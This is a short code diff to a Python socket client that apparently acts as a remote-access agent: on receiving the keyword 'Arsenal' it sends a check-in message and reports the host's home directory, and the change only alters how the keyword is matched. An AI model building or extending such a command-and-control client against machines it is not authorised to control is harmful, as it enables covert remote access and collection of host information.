@@ -14,7 +14,7 @@ def main():
         try:
             received = s.recv(buff).strip().split()
             command = [ str(x, 'utf-8') for x in received ]
-            if 'Arsenal' in str(command):
+            if 'Arsenal' in command:
                 s.send(b'Client initial checkin\n')
                 s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
                 continue
